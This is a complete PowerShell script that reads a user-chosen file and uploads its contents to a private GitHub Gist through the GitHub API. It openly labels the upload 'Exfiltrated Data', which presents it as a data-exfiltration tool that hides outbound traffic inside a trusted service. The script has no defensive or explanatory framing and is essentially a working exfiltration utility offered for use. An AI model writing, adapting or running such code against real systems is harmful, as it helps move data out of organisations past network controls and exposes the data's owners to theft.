Add-Type -AssemblyName System.Windows.Forms

# **Open File Dialog for Selection**
$OpenFileDialog = New-Object System.Windows.Forms.OpenFileDialog
$OpenFileDialog.InitialDirectory = "C:\"
$OpenFileDialog.Filter = "All files (*.*)|*.*"
$OpenFileDialog.ShowDialog() | Out-Null
$FilePath = $OpenFileDialog.FileName

# **Ensure User Selected a File**
if ($FilePath -eq "") {
    Write-Host "No file selected. Exiting..."
    exit
}

# **Read File Content**
$Content = Get-Content -Path $FilePath -Raw

# **GitHub API Token (Replace with your token)**
$Token = "YOUR_GITHUB_PERSONAL_ACCESS_TOKEN"
$GistAPI = "https://api.github.com/gists"

# **Prepare JSON Payload for Gist**
$Json = @{
    description = "Exfiltrated Data"
    public = $false
    files = @{
        (Split-Path -Leaf $FilePath) = @{
            content = $Content
        }
    }
} | ConvertTo-Json -Depth 3

# **Upload File to GitHub**
Invoke-RestMethod -Uri $GistAPI -Headers @{ Authorization = "token $Token" } -Method Post -Body $Json -ContentType "application/json"

Write-Host "File uploaded successfully to GitHub Gist!"
